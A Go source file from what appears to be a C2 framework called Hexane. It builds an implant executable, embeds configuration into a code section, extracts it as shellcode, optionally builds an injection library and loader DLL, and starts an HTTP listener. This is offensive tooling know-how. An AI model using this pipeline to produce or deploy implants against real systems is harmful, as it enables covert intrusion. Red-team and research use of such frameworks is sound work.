package core

import (
	"fmt"
	"os"
	"path"
	"path/filepath"
	"time"
)

var (
	BuildPath   = path.Join(RootDirectory, "build")
	ConfigsPath = path.Join(RootDirectory, "configs")
	CorePath    = path.Join(RootDirectory, "core")
	LogsPath    = path.Join(RootDirectory, "logs")
	LoaderPath  = path.Join(RootDirectory, "loader")
	ImplantPath = path.Join(RootDirectory, "implant")
	HashHeader  = path.Join(CorePath, "include/names.hpp")
	HashStrings = path.Join(ConfigsPath, "strings.txt")
)

func (h *HexaneConfig) BuildModule(module *Object) error {
	var err error

	WrapMessage("DBG", fmt.Sprintf("loading module config - %s", module.ConfigName))

	if module.RootDirectory == "" {
		return fmt.Errorf("source directory is required")
	}

	if module.OutputName == "" {
		return fmt.Errorf("output name is required")
	}

	if module.Linker != "" {
		module.Linker = filepath.Join(module.RootDirectory, module.Linker)
	}

	if module.PreBuildDependencies != nil {
		var dep *Object

		for _, pre := range module.PreBuildDependencies {
			if dep, err = GetModuleConfig(pre); err != nil {
				return err
			}
			if err = h.BuildModule(dep); err != nil {
				return err
			}

			module.Components = append(module.Components, dep.OutputName)
		}
	}

	if module.Type != "executable" {
		if err = h.BuildSources(module); err != nil {
			return err
		}
	} else {
		for _, src := range module.Sources {
			comp := filepath.Join(module.RootDirectory+"/src", src)
			module.Components = append(module.Components, comp)
		}
	}

	if module.Dependencies != nil {
		module.Components = append(module.Components, module.Dependencies...)
	}

	module.Definitions = h.CompilerCFG.Definitions

	if len(module.Components) > 1 {
		return h.ExecuteBuildType(module)
	} else {
		module.OutputName = module.Components[0]
		return nil
	}
}

func (h *HexaneConfig) RunBuild() error {
	var (
		err error
		obj *Object
	)

	WrapMessage("DBG", "creating payload directory")
	if err = os.MkdirAll(h.CompilerCFG.BuildDirectory, os.ModePerm); err != nil {
		return err
	}

	WrapMessage("DBG", "generating config")
	if err = h.GenerateConfigBytes(); err != nil {
		return err
	}

	WrapMessage("DBG", "generating hashes")
	if err = GenerateHashes(HashStrings, HashHeader); err != nil {
		return err
	}

	if err = SearchFile(BuildPath, "corelib.a"); err != nil {
		if err.Error() == FileNotFound.Error() {

			WrapMessage("DBG", "generating corelib\n")
			if obj, err = GetModuleConfig(path.Join(CorePath, "corelib.json")); err != nil {
				return err
			}
			if err = h.BuildModule(obj); err != nil {
				return err
			}
		} else {
			return err
		}
	}

	WrapMessage("DBG", "generating implant\n")
	if obj, err = GetModuleConfig(path.Join(ImplantPath, "implant.json")); err != nil {
		return err
	}
	if err = h.BuildModule(obj); err != nil {
		return err
	}

	WrapMessage("DBG", "embedding implant config data")
	if err = h.EmbedSectionData(BuildPath+"/implant.exe", ".text$F", h.ConfigBytes); err != nil {
		return err
	}

	WrapMessage("DBG", "extracting shellcode")
	if err = h.CopySectionData(BuildPath+"/implant.exe", path.Join(h.CompilerCFG.BuildDirectory, "shellcode.bin"), ".text"); err != nil {
		return err
	}

	if h.ImplantCFG.Injection != nil {

		WrapMessage("DBG", "generating injectlib\n")
		if err = h.BuildModule(h.ImplantCFG.Injection.Object); err != nil {
			return err
		}

		WrapMessage("DBG", "embedding injectlib config")
		if err = h.EmbedSectionData(path.Join(h.CompilerCFG.BuildDirectory, h.ImplantCFG.Injection.Object.OutputName), ".text$F", h.ConfigBytes); err != nil {
			return err
		}

		WrapMessage("DBG", "generating loader dll")
		if obj, err = GetModuleConfig(path.Join(LoaderPath, "loader.json")); err != nil {
			return err
		}
		if err = h.BuildModule(obj); err != nil {
			return err
		}
	}

	AddConfig(h)
	go h.HttpServerHandler()

	time.Sleep(time.Millisecond * 500)
	WrapMessage("INF", fmt.Sprintf("%s ready!", h.ImplantName))

	return nil
}
